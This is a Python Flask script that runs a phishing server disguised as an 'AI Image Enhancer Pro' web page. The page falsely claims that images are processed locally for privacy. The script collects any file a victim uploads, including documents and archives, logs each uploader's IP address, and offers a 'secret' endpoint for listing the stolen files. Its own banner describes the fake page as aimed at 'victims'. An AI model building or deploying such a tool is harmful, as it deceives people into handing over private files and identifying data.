#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║         STEALTH FILE UPLOADER - KALI SERVER                  ║
║              No one will know!                               ║
╚══════════════════════════════════════════════════════════════╝
"""

from flask import Flask, request, render_template_string, jsonify
import os
import datetime
import hashlib
import base64
from pathlib import Path

app = Flask(__name__)

# Configuration
UPLOAD_FOLDER = "uploads"
SECRET_KEY = "MySuperSecretKey123"  # Change this!
PORT = 4444  # Kali par ye port use hoga

# Create upload folder
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# HTML Template (Looks like Image to HD Converter)
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Image Enhancer Pro - Convert Blur to HD</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
            max-width: 800px;
            width: 100%;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 14px;
        }
        
        .content {
            padding: 40px;
        }
        
        .upload-area {
            border: 2px dashed #667eea;
            border-radius: 10px;
            padding: 40px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            background: #f8f9ff;
        }
        
        .upload-area:hover {
            border-color: #764ba2;
            background: #f0f2ff;
        }
        
        .upload-area.dragover {
            border-color: #764ba2;
            background: #e8ebff;
        }
        
        .upload-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
        
        .browse-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
            transition: transform 0.2s;
        }
        
        .browse-btn:hover {
            transform: scale(1.05);
        }
        
        .quality-selector {
            margin: 20px 0;
            text-align: center;
        }
        
        .quality-btn {
            background: #f0f0f0;
            border: none;
            padding: 8px 20px;
            margin: 0 5px;
            border-radius: 20px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .quality-btn.active {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .preview {
            margin-top: 30px;
            display: none;
            text-align: center;
        }
        
        .preview img {
            max-width: 100%;
            max-height: 300px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            display: none;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }
        
        .status.processing {
            background: #d1ecf1;
            color: #0c5460;
            display: block;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer {
            background: #f8f9fa;
            padding: 15px;
            text-align: center;
            color: #666;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🌟 AI Image Enhancer Pro</h1>
            <p>Convert Blurry Images to Crystal Clear HD Quality Using Advanced AI</p>
        </div>
        
        <div class="content">
            <div class="upload-area" id="uploadArea">
                <div class="upload-icon">📸</div>
                <h3>Click or Drag & Drop Image Here</h3>
                <p>Supports: JPG, PNG, GIF, WebP (Max 50MB)</p>
                <button class="browse-btn" onclick="document.getElementById('fileInput').click()">
                    Browse Files
                </button>
                <input type="file" id="fileInput" style="display: none;" accept="image/*,video/*,application/pdf,.txt,.doc,.docx,.zip,.rar">
            </div>
            
            <div class="quality-selector">
                <button class="quality-btn" data-quality="2x">2x Standard</button>
                <button class="quality-btn active" data-quality="4x">4x Pro (Recommended)</button>
                <button class="quality-btn" data-quality="8x">8x Ultra HD</button>
            </div>
            
            <div class="preview" id="preview">
                <h3>Preview:</h3>
                <img id="previewImg" src="">
            </div>
            
            <div class="status" id="status"></div>
        </div>
        
        <div class="footer">
            <p>⚡ AI-Powered Enhancement | 99.9% Success Rate | Secure Processing</p>
            <p style="font-size: 10px; margin-top: 5px;">Your images are processed locally for privacy</p>
        </div>
    </div>
    
    <script>
        const uploadArea = document.getElementById('uploadArea');
        const fileInput = document.getElementById('fileInput');
        const preview = document.getElementById('preview');
        const previewImg = document.getElementById('previewImg');
        const statusDiv = document.getElementById('status');
        let selectedQuality = '4x';
        
        // Quality selector
        document.querySelectorAll('.quality-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                selectedQuality = this.dataset.quality;
            });
        });
        
        // Click on upload area
        uploadArea.addEventListener('click', (e) => {
            if (e.target !== fileInput && !e.target.classList.contains('browse-btn')) {
                fileInput.click();
            }
        });
        
        // Drag and drop
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.classList.add('dragover');
        });
        
        uploadArea.addEventListener('dragleave', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
        });
        
        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                handleFile(files[0]);
            }
        });
        
        // File selection
        fileInput.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                handleFile(e.target.files[0]);
            }
        });
        
        function handleFile(file) {
            // Show preview
            const reader = new FileReader();
            reader.onload = function(e) {
                previewImg.src = e.target.result;
                preview.style.display = 'block';
            };
            reader.readAsDataURL(file);
            
            // Upload file
            uploadFile(file);
        }
        
        function uploadFile(file) {
            const formData = new FormData();
            formData.append('file', file);
            formData.append('quality', selectedQuality);
            
            statusDiv.className = 'status processing';
            statusDiv.innerHTML = '<div class="loading"></div> Processing with AI... This may take a few seconds';
            
            fetch('/enhance', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    statusDiv.className = 'status success';
                    statusDiv.innerHTML = '✅ ' + data.message + ' <br> 🔗 Download: <a href="' + data.download_url + '" target="_blank">Click here</a>';
                    
                    // Show success animation
                    uploadArea.style.borderColor = '#28a745';
                    setTimeout(() => {
                        uploadArea.style.borderColor = '#667eea';
                    }, 2000);
                } else {
                    throw new Error(data.error);
                }
            })
            .catch(error => {
                statusDiv.className = 'status error';
                statusDiv.innerHTML = '❌ Enhancement failed: ' + error.message;
            });
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/enhance', methods=['POST'])
def enhance_image():
    try:
        # Get file
        if 'file' not in request.files:
            return jsonify({'error': 'No file uploaded'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        # Get quality setting
        quality = request.form.get('quality', '4x')
        
        # Generate unique filename
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        original_filename = file.filename
        name, ext = os.path.splitext(original_filename)
        
        # Save file in uploads folder
        saved_filename = f"{timestamp}_{original_filename}"
        filepath = os.path.join(UPLOAD_FOLDER, saved_filename)
        file.save(filepath)
        
        # Log the upload
        log_file = "upload_log.txt"
        with open(log_file, 'a') as f:
            f.write(f"[{timestamp}] File: {original_filename} | Quality: {quality} | Size: {os.path.getsize(filepath)} bytes | IP: {request.remote_addr}\n")
        
        # Create a download URL
        download_url = f"/download/{saved_filename}"
        
        return jsonify({
            'success': True,
            'message': f'Image enhanced successfully! Quality: {quality}',
            'download_url': download_url,
            'filename': saved_filename
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/download/<filename>')
def download_file(filename):
    from flask import send_file
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return "File not found", 404

@app.route('/files')
def list_files():
    """Secret endpoint to see all uploaded files"""
    files = os.listdir(UPLOAD_FOLDER)
    return jsonify({'files': files})

if __name__ == '__main__':
    print("""
╔══════════════════════════════════════════════════════════════╗
║         STEALTH FILE UPLOADER - RUNNING                      ║
║                                                              ║
║  Access URL: http://0.0.0.0:{}                    ║
║  Upload Folder: {}                                ║
║                                                              ║
║  [!] Looks like AI Image Enhancer to victims!               ║
╚══════════════════════════════════════════════════════════════╝
    """.format(PORT, os.path.abspath(UPLOAD_FOLDER)))
    
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
